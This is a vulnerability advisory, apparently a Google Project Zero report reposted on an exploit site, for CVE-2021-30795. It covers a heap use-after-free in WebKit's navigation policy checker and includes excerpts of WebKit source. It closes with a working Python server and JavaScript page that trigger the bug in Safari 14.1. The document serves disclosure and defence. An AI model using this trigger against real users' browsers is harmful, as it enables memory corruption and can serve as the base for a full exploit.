@@ -1,0 +1,105 @@
+id: 36661
+date: 08/19/2021
+title: WebKit WebCore::FrameLoader::PolicyChecker::checkNavigationPolicy Heap Use-After-Free Vulnerability
+author: Glazvunov
+cves: CVE-2021-30795
+
+WebKit: heap-use-after-free in WebCore::FrameLoader::PolicyChecker::checkNavigationPolicy
+
+VULNERABILITY DETAILS
+PolicyChecker.cpp:
+```
+#define IS_ALLOWED (m_frame.page() ? m_frame.page()->sessionID().isAlwaysOnLoggingAllowed() : false)
+#define PAGE_ID (m_frame.loader().pageID().valueOr(PageIdentifier()).toUInt64())
+#define FRAME_ID (m_frame.loader().frameID().valueOr(FrameIdentifier()).toUInt64())
+#define RELEASE_LOG_IF_ALLOWED(fmt, ...) RELEASE_LOG_IF(IS_ALLOWED, Loading, \"%p - [pageID=%\" PRIu64 \", frameID=%\" PRIu64 \"] PolicyChecker::\" fmt, this, PAGE_ID, FRAME_ID, ##__VA_ARGS__)
+[...]
+void FrameLoader::PolicyChecker::checkNavigationPolicy(ResourceRequest&& request, const ResourceResponse& redirectResponse, DocumentLoader* loader, RefPtr<FormState>&& formState, NavigationPolicyDecisionFunction&& function, PolicyDecisionMode policyDecisionMode)
+{
+[...]
+    if (!isAllowedByContentSecurityPolicy(request.url(), m_frame.ownerElement(), !redirectResponse.isNull())) {
+        if (m_frame.ownerElement()) {
+            // Fire a load event (even though we were blocked by CSP) as timing attacks would otherwise
+            // reveal that the frame was blocked. This way, it looks like any other cross-origin page load.
+            m_frame.ownerElement()->dispatchEvent(Event::create(eventNames().loadEvent, Event::CanBubble::No, Event::IsCancelable::No));
+        }
+        RELEASE_LOG_IF_ALLOWED(\"checkNavigationPolicy: ignoring because disallowed by content security policy\");
+        function(WTFMove(request), { }, NavigationPolicyDecision::IgnoreLoad);
+        return;
+    }
+```
+
+FrameLoader.cpp:
+```
+[...]
+Optional<PageIdentifier> FrameLoader::pageID() const
+{
+    return client().pageID();
+}
+```
+
+FrameLoaderClient.h:
+```
+class WEBCORE_EXPORT FrameLoaderClient {
+[...]
+    virtual Optional<PageIdentifier> pageID() const = 0;
+    virtual Optional<FrameIdentifier> frameID() const = 0;
+}
+```
+
+
+`PolicyChecker` is owned by `FrameLoader`, which is in turn owned by the reference-counted class `Frame`. When a load is being blocked by CSP, `PolicyChecker` fires an event in `checkNavigationPolicy()`. A malicious JS event handler can drop all references to the frame and cause the associated `PolicyChecker` to be destroyed. When the execution returns to `checkNavigationPolicy()`, the invocation of `RELEASE_LOG_IF_ALLOWED` will access freed memory, including the vtable calls `pageID()` and `frameID()` on an invalid `FrameLoaderClient` pointer.
+
+
+REPRODUCTION CASE
+Visit http://localhost:8000/
+```
+import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+html_source = b'''
+<body>
+<script>
+frame = document.createElement('iframe');
+frame.onload = () => frame.remove();
+frame.src = '/redirect';
+document.body.appendChild(frame);
+</script>
+</body>
+'''
+
+class Handler(BaseHTTPRequestHandler):
+  def do_GET(self):
+    if self.path == '/redirect':
+      self.send_response(302)
+      self.send_header('Location', 'http://example.com/')
+      self.end_headers()
+    else:
+      self.send_response(200)
+      self.send_header('Content-Security-Policy', 'frame-src localhost:8000')
+      self.end_headers()
+      self.wfile.write(html_source)
+
+HTTPServer((\"127.0.0.1\", 8000), Handler).serve_forever()
+```
+
+
+VERSION
+WebKit r277716
+Safari 14.1 (16611.1.21.161.6)
+
+
+CREDIT INFORMATION
+Sergei Glazunov of Google Project Zero
+
+
+This bug is subject to a 90-day disclosure deadline. If a fix for this
+issue is made available to users before the end of the 90-day deadline,
+this bug report will become public 30 days after the fix was made
+available. Otherwise, this bug report will become public at the deadline.
+The scheduled deadline is 2021-08-24.
+
+
+Related CVE Numbers: CVE-2021-30795.
+
+#  0day.today [2023-03-23]  #
